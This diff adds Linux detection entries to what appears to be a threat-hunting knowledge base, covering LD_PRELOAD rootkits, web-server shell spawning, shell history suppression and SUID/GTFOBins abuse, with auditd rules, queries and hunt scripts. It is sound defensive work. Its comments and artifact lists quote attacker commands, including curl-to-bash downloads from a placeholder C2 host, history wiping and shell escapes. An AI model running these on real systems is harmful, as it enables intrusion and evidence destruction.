@@ -3523,6 +3523,226 @@ Velociraptor:
           { cls: "apt-mul", name: "Red Team", note: "memfd_create ELF loaders (ddexec-style) are standard modern Linux EDR-evasion tradecraft." },
         ],
         cite: "MITRE ATT&CK T1106",
+      },
+      {
+        sub: "T1106 - Linux Shared Library Injection (LD_PRELOAD / /etc/ld.so.preload)",
+        os: "linux",
+        indicator: "/etc/ld.so.preload file created or modified (injects a .so into every process system-wide); LD_PRELOAD environment variable set to a path in /tmp or /dev/shm; ldconfig invocation outside of package manager context; or a .so file dropped to a non-standard path",
+        sysmon: `// Auditd rules for shared library injection
+
+// /etc/ld.so.preload — highest severity; should not exist on clean host
+-w /etc/ld.so.preload -p wa -k ldso_preload_write
+-w /etc/ld.so.conf -p wa -k ldso_conf_write
+-w /etc/ld.so.conf.d -p wa -k ldso_conf_write
+
+// ldconfig execution (registers a new library system-wide)
+-a always,exit -F arch=b64 -S execve \\
+  -F path=/sbin/ldconfig -k ldconfig_exec
+-a always,exit -F arch=b64 -S execve \\
+  -F path=/usr/sbin/ldconfig -k ldconfig_exec
+
+// .so file drops in suspicious locations
+// (file in /tmp / /dev/shm with .so extension)
+-a always,exit -F arch=b64 -S creat,open,openat \\
+  -F dir=/tmp -F perm=w -k tmp_write
+  # Filter in SIEM: file name ends with .so or .so.*
+
+// Sysmon for Linux EID 11: TargetFilename matches
+//   /etc/ld.so.preload (critical)
+//   */tmp/*.so  OR  */dev/shm/*.so (high)`,
+        kibana: `// /etc/ld.so.preload — critical; should not exist
+event.module: "file_integrity"
+AND file.path: "/etc/ld.so.preload"
+
+// ldconfig outside package manager (library registration)
+event.module: "auditd"
+AND tags: "ldconfig_exec"
+AND NOT process.parent.name: (
+  "apt" OR "apt-get" OR "dpkg" OR "rpm" OR "yum"
+  OR "dnf" OR "zypper" OR "pip" OR "pip3"
+)
+
+// ld.so.conf.d new file (adds library search path)
+event.module: "file_integrity"
+AND file.path: /etc/ld.so.conf.d/*
+AND event.type: "created"
+
+// .so file dropped to /tmp, /dev/shm, /var/tmp
+event.module: "file_integrity"
+AND file.path: (*/tmp/*.so* OR */dev/shm/*.so* OR */var/tmp/*.so*)
+AND event.type: "created"
+
+// Process environment shows LD_PRELOAD to suspicious path
+// (enriched from /proc/<pid>/environ)
+process.env_vars: (*LD_PRELOAD=* AND (*tmp* OR *shm* OR *home* OR *var/tmp*))
+
+// LD_PRELOAD in shell config writes (persistence)
+event.module: "file_integrity"
+AND file.path: (/etc/profile.d/* OR */.bashrc OR */.bash_profile)`,
+        powershell: `#!/bin/bash
+# T1106 - LD_PRELOAD / shared library injection hunt
+
+echo "[*] === /etc/ld.so.preload (should NOT exist on clean host) ==="
+if [ -f /etc/ld.so.preload ]; then
+  echo "[CRITICAL FLAG] /etc/ld.so.preload EXISTS:"
+  cat /etc/ld.so.preload
+  echo "  mtime: $(stat -c '%y' /etc/ld.so.preload)"
+else
+  echo "[OK] /etc/ld.so.preload does not exist"
+fi
+
+echo ""
+echo "[*] === /etc/ld.so.conf.d/ (library path config) ==="
+ls -la /etc/ld.so.conf.d/
+for f in /etc/ld.so.conf.d/*; do
+  [ -f "$f" ] || continue
+  echo "--- $f ---"
+  cat "$f"
+  echo "  package: $(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null || echo NOT FROM PACKAGE)"
+done
+
+echo ""
+echo "[*] === LD_PRELOAD in all running process environments ==="
+for pid in $(ls /proc | grep -E '^[0-9]+$'); do
+  env_line=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep LD_PRELOAD)
+  if [ -n "$env_line" ]; then
+    comm=$(cat /proc/$pid/comm 2>/dev/null)
+    echo "[FLAG] PID $pid ($comm): $env_line"
+  fi
+done
+
+echo ""
+echo "[*] === .so files in suspicious locations ==="
+find /tmp /dev/shm /var/tmp /run -name "*.so*" -type f 2>/dev/null | \\
+  while read f; do
+    echo "[FLAG] $f | $(file "$f" | awk -F: '{print $2}') | mtime: $(stat -c '%y' "$f")"
+  done
+
+echo ""
+echo "[*] === LD_PRELOAD in shell configs ==="
+grep -r "LD_PRELOAD\\|LD_LIBRARY_PATH" \\
+  /etc/profile /etc/profile.d/ /etc/bash.bashrc \\
+  /root/.bashrc /home/*/.bashrc 2>/dev/null | grep -v "^#"
+
+echo ""
+echo "[*] === Non-standard libraries loaded by key processes ==="
+for proc in sshd apache2 httpd nginx; do
+  pid=$(pgrep -x "$proc" | head -1)
+  [ -z "$pid" ] && continue
+  echo "--- $proc (PID $pid) non-standard .so files ---"
+  lsof -p "$pid" 2>/dev/null | grep "\\.so" | \\
+    grep -v "^/usr/lib\\|^/lib/x86\\|^/lib64\\|^/lib/aarch"
+done`,
+        registry: `LD_PRELOAD injection artifact locations:
+
+Primary targets (highest severity):
+  /etc/ld.so.preload       - system-wide preload; loads listed .so
+                             into EVERY process; should never exist
+                             on a clean Linux system
+  LD_PRELOAD env variable  - per-shell preload; set in ~/.bashrc
+                             or systemd unit files
+
+Library path configuration:
+  /etc/ld.so.conf           - library search path config (root)
+  /etc/ld.so.conf.d/*.conf  - path fragments (package-managed)
+  /etc/ld.so.cache          - binary cache rebuilt by ldconfig
+
+Userland rootkits using LD_PRELOAD:
+  Azazel: hides files, processes, connections via hooked readdir()
+  Jynx2: OpenSSH credential harvesting via libssl hooks
+  Ebury: hooks libssl; harvests SSH creds; millions of servers
+  libprocesshider: hides named process from ps/top
+
+Drop locations for malicious .so:
+  /tmp/<random>.so
+  /dev/shm/<name>.so
+  /usr/local/lib/<spoofed-name>.so (harder to spot)
+
+Process library inspection:
+  lsof -p <pid> | grep .so    - all .so loaded by PID
+  cat /proc/<pid>/maps | grep .so  - memory-mapped libraries
+  strace -e openat <cmd>      - shows library load order
+
+Package integrity:
+  dpkg --verify libc6 libssl-dev  (Debian)
+  rpm -V glibc openssl-libs       (RHEL)
+  '5' on any library = checksum failure = critical`,
+        tools: `LD_PRELOAD rootkits in the wild:
+
+Ebury / Windigo (RU-nexus):
+  Most sophisticated LD_PRELOAD rootkit documented.
+  Hooks libssl to capture SSH credentials in plaintext.
+  Estimated millions of OpenSSH server infections.
+  Targets hosting providers; ESET research 2014-2024.
+  Uses /etc/ld.so.preload for system-wide persistence.
+
+Azazel (open source):
+  github.com/chokepoint/azazel
+  Hooks readdir(), tcp connection tables, process lists
+  Hides attacker files, processes, and network connections
+
+Jynx2:
+  OpenSSH-targeted LD_PRELOAD credential harvester
+  Hooks authentication functions to capture passwords
+
+libprocesshider:
+  Single-purpose: hides one named process from ps/top
+  github.com/gianlucaborello/libprocesshider
+  Used by cryptominer campaigns to hide miner process
+
+Cryptominer dropper campaigns:
+  Rocke, 8220 Gang, TeamTNT all documented using
+  malicious .so via LD_PRELOAD to hide mining processes
+  from ps, top, and monitoring agents
+
+ptrace-based injection (companion technique):
+  ptrace(PTRACE_ATTACH, pid)
+  PTRACE_POKETEXT to inject shellcode into running process
+  More complex than LD_PRELOAD but works on running processes
+  Detectable via auditd ptrace syscall events`,
+        ossdetect: `Sigma rules:
+- file_event_lnx_ld_so_preload_modification.yml
+- file_event_lnx_so_file_drop_suspicious_path.yml
+- proc_creation_lnx_ldconfig_unusual_parent.yml
+
+Elastic detection rules:
+- Modification of /etc/ld.so.preload
+- Shared Library Injection via LD_PRELOAD
+
+rkhunter:
+  rkhunter --check
+  Tests /etc/ld.so.preload explicitly
+  Checks known rootkit shared library signatures
+  rkhunter.sourceforge.net
+
+chkrootkit:
+  chkrootkit
+  Checks for LD_PRELOAD-based rootkit file signatures
+
+Volatility3:
+  linux.library_list  - enumerate all loaded .so per process
+  Compare loaded libs against clean baseline
+
+AIDE / Tripwire:
+  /etc/ld.so.preload  p+sha256+i+n+u+g
+  /etc/ld.so.conf.d   p+sha256+i+n+u+g
+  Any change to either = immediate alert
+
+Package verify:
+  dpkg --verify libc6 (Debian)
+  rpm -V glibc        (RHEL)
+  '5' flag on library file = checksum mismatch = critical
+
+auditd:
+  ausearch -k ldso_preload_write --start today
+  ausearch -k ldso_conf_write --start today`,
+        notes: "/etc/ld.so.preload is the highest-severity LD_PRELOAD artifact: any library listed there is injected into every process that starts on the system, giving an attacker simultaneous hooks in sshd, sudo, cron, and every other daemon. On a clean system this file should not exist at all - its mere presence is a critical indicator warranting immediate investigation. The LD_PRELOAD environment variable variant is more targeted: it affects only processes launched from the shell where the variable is set, making it less persistent but harder to detect because it leaves no on-disk configuration artifact beyond a shell config modification. The detection counter is /proc/<pid>/environ, which preserves each running process's environment - scanning all running processes for LD_PRELOAD pointing to non-standard paths catches active exploitation. For the Ebury/Windigo family specifically: it targets the libssl shared library, hooking authentication functions to capture SSH credentials in plaintext from every SSH connection the server processes. This is not just persistence - it is a credential harvesting mechanism that affects every user authenticating through the compromised server. File integrity monitoring on /etc/ld.so.preload and package manager verification of core libraries (libc6, libssl) are the primary controls.",
+        apt: [
+          { cls: "apt-ru", name: "Ebury / Windigo", note: "Most sophisticated LD_PRELOAD rootkit documented; hooks libssl to harvest SSH credentials from millions of OpenSSH servers globally." },
+          { cls: "apt-cn", name: "Rocke / 8220 Gang", note: "LD_PRELOAD process hiding used to conceal crypto mining from ps and monitoring agents on compromised cloud servers." },
+          { cls: "apt-mul", name: "Azazel / Jynx2 users", note: "Open-source LD_PRELOAD rootkits used by financially motivated actors for credential harvesting and process hiding on Linux servers." }
+        ],
+        cite: "MITRE ATT&CK T1106"
       }
     ]
   },
@@ -4288,6 +4508,592 @@ Other:
           { cls: "apt-mul", name: "Cryptojacking / TeamTNT", note: "curl|bash droppers are the near-universal delivery for Linux coinminers and worms." },
         ],
         cite: "MITRE ATT&CK T1059.004",
+      },
+      {
+        sub: "T1059.004 - Web Server Process Spawning Interactive Shell (RCE Indicator)",
+        os: "linux",
+        indicator: "bash/sh/dash spawned where parent process is a web or application server (httpd, nginx, php-fpm, java/Tomcat, gunicorn, uwsgi) — near-certain web exploitation RCE; shell child of any web worker has near-zero legitimate justification",
+        sysmon: `// Sysmon for Linux EID 1 (ProcessCreate)
+// Parent = web process, Child = shell
+
+EventID=1
+ParentImage matches (any of):
+  */httpd  */apache2  */apache  */lighttpd
+  */nginx  */php  */php-fpm  */php7*  */php8*
+  */python*  */gunicorn  */uwsgi
+  */java  */catalina  */node  */ruby  */perl
+AND Image matches:
+  */bash  */sh  */dash  */zsh  */csh
+
+// auditd rule (supplemental):
+// -a always,exit -F arch=b64 -S execve -k exec
+// Then in SIEM: correlate execve where auid maps to
+// a process tree rooted at a web worker PID
+
+// High-signal variant: shell spawning a downloader
+// (httpd → bash → curl/wget = confirmed stage-2 pull)
+ParentImage matches (*httpd* OR *nginx* OR *php* OR *java*)
+AND Image matches (*bash* OR */sh OR */dash*)
+AND CommandLine matches (*curl* OR *wget* OR *python* OR /tmp/* OR /dev/shm/*)`,
+        kibana: `// High-confidence: web process parent, shell child
+process.name: ("bash" OR "sh" OR "dash" OR "zsh")
+AND process.parent.name: (
+  "httpd" OR "apache2" OR "nginx" OR "lighttpd"
+  OR "php" OR "php-fpm" OR "php7.4-fpm" OR "php8.1-fpm" OR "php8.2-fpm"
+  OR "python" OR "python3" OR "ruby" OR "perl"
+  OR "java" OR "node" OR "gunicorn" OR "uwsgi"
+)
+
+// Sysmon for Linux EID 1
+event.code: "1"
+AND process.executable: (*bash OR *sh OR *dash OR *zsh)
+AND process.parent.executable: (
+  *httpd* OR *apache* OR *nginx* OR *php*
+  OR *java* OR *python* OR *ruby* OR *perl* OR *node*
+  OR *gunicorn* OR *uwsgi*
+)
+
+// Shell spawned by web process then runs downloader
+process.name: ("bash" OR "sh" OR "dash")
+AND process.parent.name: (*httpd* OR *nginx* OR *php* OR *java* OR *python*)
+AND process.command_line: (*curl* OR *wget* OR */tmp/* OR */dev/shm/*)
+
+// Falco-style: spawned_process AND parent in web_server_binaries
+// (Falco built-in rule covers this natively)`,
+        powershell: `#!/bin/bash
+# T1059.004 - Web process spawning shell hunt
+
+echo "[*] === Sysmon for Linux: web-spawned shell events ==="
+if [ -f /var/log/syslog ]; then
+  grep -E "ParentImage.*/(httpd|apache|nginx|php|java|python|ruby|perl|node|gunicorn|uwsgi)" \\
+    /var/log/syslog 2>/dev/null | grep -E "Image.*/(bash|sh|dash|zsh)" | tail -50
+fi
+
+echo ""
+echo "[*] === auditd: execve where parent was a web process ==="
+ausearch -k exec -i 2>/dev/null | \\
+  awk '/^----/{block=""} {block=block $0 "\\n"}
+       /exe=.*\\/(bash|sh|dash|zsh)/{
+         if (block ~ /(httpd|apache|nginx|php|java|python3?|ruby|perl|node|gunicorn|uwsgi)/)
+           print block}' | head -100
+
+echo ""
+echo "[*] === Live: shells whose parent is a web process ==="
+for pid in $(pgrep -x bash) $(pgrep -x sh) $(pgrep -x dash); do
+  ppid=$(awk '/PPid/{print $2}' /proc/$pid/status 2>/dev/null)
+  parent=$(cat /proc/$ppid/comm 2>/dev/null)
+  if echo "$parent" | grep -qiE "httpd|apache|nginx|php|java|python|ruby|perl|node|gunicorn|uwsgi"; then
+    echo "[ALERT] Shell PID $pid parent=$parent (PPID $ppid)"
+    tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null; echo
+  fi
+done
+
+echo ""
+echo "[*] === Web access logs: POST to small/unusual PHP/JSP ==="
+for log in /var/log/apache2/access.log /var/log/nginx/access.log /var/log/httpd/access_log; do
+  [ -f "$log" ] || continue
+  echo "--- $log (recent POSTs to .php/.jsp) ---"
+  grep "POST" "$log" 2>/dev/null | grep -E "\\.(php|jsp|cgi|pl|py)" | tail -20
+done`,
+        registry: `No registry on Linux. RCE execution artifacts:
+
+Web log files (correlate with process tree):
+  /var/log/apache2/access.log    - POST to vulnerable endpoint
+  /var/log/apache2/error.log     - PHP/CGI errors pre-exec
+  /var/log/nginx/access.log
+  /var/log/nginx/error.log
+  /var/log/httpd/access_log      - RHEL path
+
+Webshell file artifacts:
+  /var/www/html/**/*.php         - PHP webshell (small file, mtime anomaly)
+  /var/www/html/**/*.jsp         - JSP webshell (Tomcat targets)
+  /tmp/*.php , /dev/shm/*.php
+  /var/www/uploads/**/*          - uploaded payloads
+
+CGI directories:
+  /usr/lib/cgi-bin/              - malicious CGI scripts
+  /var/www/cgi-bin/
+
+Process ancestry (definitive):
+  web process should NEVER have shell children
+  /proc/<pid>/status → PPid chain traces the parent
+  httpd → bash = webshell or direct exploit
+
+PHP functions that indicate webshell:
+  eval(), system(), exec(), passthru(), shell_exec()
+  proc_open(), popen(), pcntl_exec()
+  (grep -r these in webroot for webshell hunt)`,
+        tools: `Web process → shell is the post-exploitation entry for:
+
+APT41 (CN) - exploits internet-facing apps (Confluence,
+  Log4j, Citrix, F5) for initial access; java → bash
+  or php-fpm → dash is the exact process tree pattern
+
+UNC3524 / Salt Typhoon / Volt Typhoon (CN) - exploitation
+  of internet-facing management interfaces; web process
+  shell spawn in CISA advisories 2024-2025
+
+MuddyWater / APT34 (IR) - PHP webshells for initial access
+  on Linux web servers; CGI-spawned shell is signature
+
+Log4Shell (CVE-2021-44228) operators: java → sh → curl
+  is the canonical artifact; massive volume 2021-2023
+
+ProxyShell, Spring4Shell, Confluence CVEs:
+  Application server → shell → download payload
+
+Webshell families on Linux:
+  WSO, b374k, China Chopper, Godzilla
+  (all generate web-process-spawned shell tree)
+
+Falco built-in rule covers this exactly:
+  "Spawning Shell in a Container" and
+  "Run shell untrusted" detect web → shell patterns
+  requiring zero custom rule development`,
+        ossdetect: `Sigma rules:
+- proc_creation_lnx_webserver_spawning_shell.yml
+- proc_creation_lnx_java_shell_spawn.yml (Log4j)
+- proc_creation_lnx_susp_shell_parent.yml
+
+Elastic detection rules:
+- Web Shell Detected on Linux Server
+- Linux Web Server Spawning Shell
+- Shell Spawned by Web Server Process
+
+Falco (built-in, high-confidence):
+  rule: Spawning Shell in a Container
+  rule: Run shell untrusted
+  condition: spawned_process and shell_procs
+    and proc.pname in (web_server_binaries)
+
+Wazuh:
+  Built-in rule 31101 (web attack detected)
+  Custom rule: spawned_process where parent
+  in apache_binaries triggers alert
+
+Atomic Red Team:
+  T1190 tests simulate webshell drop and execution
+  (exploit public-facing application → shell)
+
+GRR / Velociraptor:
+  Linux.Detection.WebShell
+  Hunt for small .php files with shell functions
+  in webroot directories`,
+        notes: "Web server process spawning a shell is the single highest-confidence RCE indicator on Linux servers. nginx, Apache, PHP-FPM, and Java application servers have no legitimate reason to spawn an interactive shell. When you see httpd → bash or php-fpm → sh → wget in your process tree, you are looking at webshell execution or direct web vulnerability exploitation. The detection is straightforward to implement and extremely low false-positive: the parent process set (web workers) is small and well-defined, and any shell child is anomalous. Correlate with web access logs to identify the exploited endpoint: look for POST requests to small PHP files or unusual URL patterns in the seconds before the shell spawn. The CGI pattern (httpd directly spawning a shell) is less common on modern stacks but still appears on legacy systems. The modern pattern is php-fpm → dash → curl/wget/python, or java (Tomcat/Spring/Log4j) → sh → payload. Falco provides this detection as a built-in rule with near-zero tuning required. Deploy it or the equivalent Sigma/Elastic rule as a high-severity alert on any Linux server hosting web applications.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "Exploits internet-facing applications (Log4j, Confluence, Citrix, F5) for initial access; web process → bash shell tree is the signature artifact." },
+          { cls: "apt-cn", name: "Salt/Volt Typhoon", note: "CISA-documented exploitation of internet-facing appliances; web process shell spawn observed in multiple advisories 2024-2025." },
+          { cls: "apt-ir", name: "MuddyWater / APT34", note: "PHP webshells used extensively for Linux server initial access; CGI/PHP-FPM parent → shell is characteristic." },
+          { cls: "apt-ru", name: "APT28", note: "Web server exploitation against Linux infrastructure; web-spawned shell process tree documented." },
+          { cls: "apt-mul", name: "Log4Shell / mass exploiters", note: "CVE-2021-44228 generated enormous volumes of java → sh → curl; many APT and criminal groups exploited this pattern." }
+        ],
+        cite: "MITRE ATT&CK T1059.004"
+      },
+      {
+        sub: "T1059.004 - Shell History Suppression and Command Obfuscation",
+        os: "linux",
+        indicator: "HISTFILE redirected to /dev/null, HISTSIZE=0, or 'unset HISTFILE' as first post-access commands; shell obfuscation via ${IFS} word-split bypass, $'\\x..' hex literals, or eval-encoded payloads to evade string-match detection",
+        sysmon: `// Sysmon for Linux EID 1 - history suppression commands
+// and obfuscation patterns in shell command lines
+
+// HISTFILE suppression (catch via auditd execve)
+CommandLine matches (any of):
+  *HISTFILE=/dev/null*
+  *HISTSIZE=0*  OR  *HISTFILESIZE=0*
+  *unset HISTFILE*  OR  *unset HISTSIZE*
+  *history -c*  OR  *history -w /dev/null*
+
+// Shell obfuscation - IFS word-split bypass
+// Attacker writes: curl\${IFS}http://C2/p|bash
+// instead of: curl http://C2/p|bash
+CommandLine matches: *\${IFS}* OR *$IFS*
+
+// Hex-encoded command string in bash
+CommandLine matches: *$'\\\\x* OR *printf '\\\\x* OR *echo -e '\\\\x*
+
+// Eval with encoding function (base64, rev, xxd)
+CommandLine matches:
+  *eval* AND (*base64* OR *rev * OR *xxd*)
+
+// PROMPT_COMMAND set to clear history before each prompt
+CommandLine matches: *PROMPT_COMMAND*history*`,
+        kibana: `// HISTFILE suppression - high-confidence IOC
+process.command_line: (
+  *HISTFILE=/dev/null* OR *HISTSIZE=0* OR *HISTFILESIZE=0*
+  OR *"unset HISTFILE"* OR *"unset HISTSIZE"*
+  OR *"history -c"* OR *"history -w /dev/null"*
+)
+
+// \${IFS} substitution in shell commands
+process.name: ("bash" OR "sh" OR "dash")
+AND process.command_line: (*\${IFS}* OR *$IFS*)
+
+// Hex-encoded command literal
+process.command_line: (*$'\\x* OR *printf '\\x* OR *echo -e '\\x*)
+
+// eval with encoding
+process.name: ("bash" OR "sh" OR "dash")
+AND process.command_line: (*eval* AND (*base64* OR *rev *))
+
+// Sysmon EID 1 - any of the above
+event.code: "1"
+AND process.command_line: (
+  *HISTFILE=/dev/null* OR *\${IFS}* OR *$'\\x* OR *"history -c"*
+)
+
+// Auditd: check environment of running shells for HISTFILE
+// /proc/<pid>/environ shows live HISTFILE value`,
+        powershell: `#!/bin/bash
+# T1059.004 - History suppression and obfuscation hunt
+
+echo "[*] === HISTFILE suppression in existing shell history ==="
+for hf in /root/.bash_history /home/*/.bash_history; do
+  [ -f "$hf" ] || continue
+  echo "--- $hf ---"
+  grep -n -E "(HISTFILE|HISTSIZE|HISTFILESIZE|unset HIST|history -c)" "$hf" 2>/dev/null
+done
+
+echo ""
+echo "[*] === Empty or missing history files on active accounts ==="
+getent passwd | awk -F: '$3 >= 1000 && $7 !~ /nologin|false/ {print $1,$6}' | \\
+  while read user home; do
+    hf="$home/.bash_history"
+    if [ -f "$hf" ]; then
+      lines=$(wc -l < "$hf")
+      [ "$lines" -eq 0 ] && \\
+        echo "[FLAG] Empty history: $hf (mtime: $(stat -c '%y' "$hf"))"
+    fi
+  done
+
+echo ""
+echo "[*] === Live HISTFILE values in running shells ==="
+for pid in $(pgrep -x bash) $(pgrep -x sh) $(pgrep -x dash); do
+  hf=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep "^HISTFILE=")
+  hs=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep "^HISTSIZE=\\|^HISTFILESIZE=")
+  if echo "$hf" | grep -qE "(dev/null|/tmp|/dev/shm)"; then
+    echo "[FLAG] PID $pid: $hf"
+  fi
+  if echo "$hs" | grep -qE "=0$"; then
+    echo "[FLAG] PID $pid history size zeroed: $hs"
+  fi
+done
+
+echo ""
+echo "[*] === auditd: HISTFILE manipulation events (today) ==="
+ausearch -k exec -i --start today 2>/dev/null | \\
+  grep -E "(HISTFILE|HISTSIZE|history -c)" | tail -30
+
+echo ""
+echo "[*] === Obfuscated commands in bash history ==="
+for hf in /root/.bash_history /home/*/.bash_history; do
+  [ -f "$hf" ] || continue
+  echo "--- $hf ---"
+  grep -nE '(\\$\\{IFS\\}|\\$IFS|\\$'"'"'\\\\\\\\x|eval.*base64|printf.*\\\\x)' "$hf" 2>/dev/null
+done`,
+        registry: `Shell history file locations:
+  ~/.bash_history        - default (controlled by HISTFILE)
+  ~/.zsh_history         - zsh
+  ~/.sh_history          - POSIX sh
+  /root/.bash_history    - root's history
+
+History suppression indicators:
+  Empty HISTFILE (0 bytes)
+  HISTFILE symlinked to /dev/null
+  HISTFILE pointing to /tmp/*, /dev/shm/*
+  HISTSIZE=0 or HISTFILESIZE=0 in shell env
+  .bash_logout containing: history -c; rm -f ~/.bash_history
+  PROMPT_COMMAND='history -c' (wipes before every prompt)
+
+Live environment check:
+  /proc/<pid>/environ    - shows HISTFILE/HISTSIZE for running shell
+  (survives even after shell clears history interactively)
+
+Obfuscation encoding patterns to grep:
+  \${IFS}                 - replaces space to evade keyword split
+  $'\\x41\\x42'          - hex literal encoding in bash
+  {c,u,r,l}             - brace expansion to spell commands
+  $(echo Y3Vybg==|base64 -d)  - inline decode
+  eval "$(...)"          - delayed execution via subshell
+
+Shell config obfuscation vectors:
+  alias ls='ls; curl C2/ph | bash'  - command hijack via alias
+  function cd() { builtin cd "$@"; malware; }  - function override`,
+        tools: `History suppression is near-universal attacker behavior
+on interactive Linux shells across all threat categories.
+
+Standard first-session commands observed across APTs:
+  export HISTFILE=/dev/null
+  unset HISTFILE
+  set +o history
+
+Post-ex framework behavior:
+  Metasploit python/shell stages: frequently unset HISTFILE
+  Empire Linux agents: cleanup routines wipe history
+  Manual operators: history suppression is documented
+    in operator TTPs for Lazarus, APT41, Equation Group
+
+\${IFS} obfuscation context:
+  Evades simple grep/string-match detection rules that
+  look for "curl http" but not "curl\${IFS}http"
+  Common in automated worm/dropper scripts targeting
+  minimal detection environments
+
+$'\\x..' encoding context:
+  Encodes banned words (bash, curl, wget) as hex literals
+  Bash interprets $'\\x62\\x61\\x73\\x68' as "bash"
+  Evades SIEM rules checking for literal keyword strings
+
+PROMPT_COMMAND abuse:
+  Bash executes PROMPT_COMMAND before every prompt display
+  export PROMPT_COMMAND='history -c'
+  Wipes history in real-time; no post-session artifact remains`,
+        ossdetect: `Sigma rules:
+- proc_creation_lnx_shell_history_wipe.yml
+- proc_creation_lnx_histfile_redirection.yml
+- proc_creation_lnx_shell_obfuscation_ifsvar.yml
+- proc_creation_lnx_eval_encoded_payload.yml
+
+Elastic detection rules:
+- Shell History File Deletion or Modification
+- Bash History Cleared or Unset
+- Potential Shell Obfuscation via IFS
+
+Auditd configuration (catch all execve arguments):
+  -a always,exit -F arch=b64 -S execve -k exec
+  -w /root/.bash_history -p rwa -k hist_write
+  (broad; SIEM-side filter on HISTFILE keyword in args)
+
+auditd + ausearch:
+  ausearch -k exec -i | grep -E 'HISTFILE|HISTSIZE|history -c'
+
+Wazuh:
+  Syscheck on ~/.bash_history files
+  Built-in rules for history file modification
+
+Atomic Red Team:
+  T1562.003 (Impair Defenses: HISTFILE clear)
+  Also relevant: T1059.004 shell obfuscation tests
+
+Shell audit note:
+  Even with HISTFILE=/dev/null, auditd execve log
+  captures every command if -S execve is active.
+  Auditd is the counter-move to history suppression.`,
+        notes: "HISTFILE and shell history suppression is the single most consistent attacker behavior on interactive Linux shells - it is near-universal because it costs nothing and eliminates a primary forensic artifact. The important detection insight: a missing or empty ~/.bash_history on a long-running server with active admin users is immediately suspicious. The /proc/<pid>/environ counter-move is powerful: even if an attacker unsets HISTFILE interactively, the live environment of their shell process retains HISTFILE=/dev/null or HISTSIZE=0, visible via /proc. This doesn't survive process death, making it a live-host-only signal. For obfuscation, ${IFS} substitution is the most common evasion because it requires no encoding - it replaces the space character used to separate flagged keywords, evading simple string-match detection. The correct defense is full auditd execve capture: the audit log records all command arguments before the shell processes them, so even obfuscated commands appear partially decoded in the log. Pair HISTFILE monitoring with auditd execve to close both the evidence-destruction and evasion gaps.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "History suppression documented as standard operational security across Linux intrusions; ${IFS} and eval obfuscation used in dropper scripts." },
+          { cls: "apt-kp", name: "Lazarus", note: "HISTFILE manipulation and shell cleanup documented in post-exploitation stages of Linux financial sector intrusions." },
+          { cls: "apt-ru", name: "APT28 / Equation Group", note: "Advanced obfuscation and anti-forensics including history manipulation documented across campaigns." },
+          { cls: "apt-mul", name: "All interactive operators", note: "Unsetting HISTFILE is near-universal first-move tradecraft on any interactive Linux shell; applies across commodity and nation-state actors." }
+        ],
+        cite: "MITRE ATT&CK T1059.004"
+      },
+      {
+        sub: "T1059.004 - SUID Interpreter and GTFOBins Sudo-less Execution",
+        os: "linux",
+        indicator: "Execution via SUID-bit interpreter (bash -p, python3 -p, perl with SUID) or GTFOBins-listed binary (find -exec, awk system(), vim :!/bin/sh) to gain elevated shell without sudo; or Linux capability abuse (cap_setuid on python3) for password-free privilege",
+        sysmon: `// Sysmon for Linux EID 1 - SUID and GTFOBins execution
+
+// bash -p (preserve effective UID when SUID set)
+CommandLine matches: *bash -p* OR *bash --privileged*
+
+// python/python3 with -p flag (preserve SUID priv)
+Image=*/python* AND CommandLine matches: *-p *
+
+// perl one-liner from SUID context
+Image=*/perl AND CommandLine matches: *exec*/bin/sh*
+
+// GTFOBins: find with -exec shell
+Image=*/find AND CommandLine matches:
+  *-exec */bin/sh* OR *-exec bash* OR *-exec dash*
+
+// GTFOBins: awk system() call
+Image=*/awk AND CommandLine matches:
+  *system(* OR *BEGIN{system*
+
+// GTFOBins: vim/vi launching shell
+Image=(*vim OR *vi) AND CommandLine matches:
+  *!/bin/sh* OR *!/bin/bash* OR *-c :!/bin/sh*
+
+// GTFOBins: env executing shell directly
+Image=*/env AND CommandLine matches:
+  *env /bin/sh* OR *env /bin/bash* OR *env bash*
+
+// sudo -l enumeration (recon before GTFOBins abuse)
+Image=*/sudo AND CommandLine matches: *-l*`,
+        kibana: `// SUID bash / python execution (preserving effective UID)
+process.command_line: ("bash -p" OR "bash --privileged")
+
+process.name: ("python" OR "python3")
+AND process.command_line: *-p *
+
+// GTFOBins execution patterns
+process.name: "find"
+AND process.command_line: (*-exec* AND (*bash* OR */bin/sh* OR *dash*))
+
+process.name: "awk"
+AND process.command_line: (*system(* OR *BEGIN{*)
+AND process.command_line: (*bash* OR */bin/sh* OR *sh"*)
+
+process.name: ("vim" OR "vi")
+AND process.command_line: (*!/bin/sh* OR *!/bin/bash* OR *shell*)
+
+process.name: "env"
+AND process.command_line: (*env /bin/sh* OR *env /bin/bash* OR *env bash*)
+
+// sudo -l recon (frequently precedes GTFOBins abuse)
+process.name: "sudo"
+AND process.command_line: *-l*
+
+// auditd: SUID execution (auid != uid where uid=0)
+event.module: "auditd"
+AND auditd.data.syscall: "execve"
+AND auditd.data.uid: "0"
+AND NOT auditd.data.auid: "0"
+AND NOT auditd.data.auid: "4294967295"  // unset auid`,
+        powershell: `#!/bin/bash
+# T1059.004 - SUID/capabilities/GTFOBins hunt
+
+echo "[*] === All SUID binaries ==="
+find / -perm -4000 -type f 2>/dev/null | sort | \\
+  while read f; do
+    echo "$f | owner: $(stat -c '%U' "$f") | perms: $(stat -c '%a' "$f")"
+  done
+
+echo ""
+echo "[*] === SUID binaries NOT from package manager ==="
+find / -perm -4000 -type f 2>/dev/null | sort | \\
+  while read f; do
+    if ! (dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null) | grep -q .; then
+      echo "[FLAG] Non-packaged SUID: $f"
+      ls -la "$f"
+    fi
+  done
+
+echo ""
+echo "[*] === GTFOBins candidates with SUID set ==="
+BINS="python python2 python3 perl ruby awk nmap find vim vi \\
+      less more env tee bash dash sh node lua php"
+for b in $BINS; do
+  p=$(which $b 2>/dev/null); [ -z "$p" ] && continue
+  perms=$(stat -c '%a' "$p" 2>/dev/null)
+  # SUID if first digit >= 4
+  if [ "\${perms:0:1}" -ge 4 ] 2>/dev/null; then
+    echo "[FLAG] SUID GTFOBin: $p (perms: $perms)"
+  fi
+done
+
+echo ""
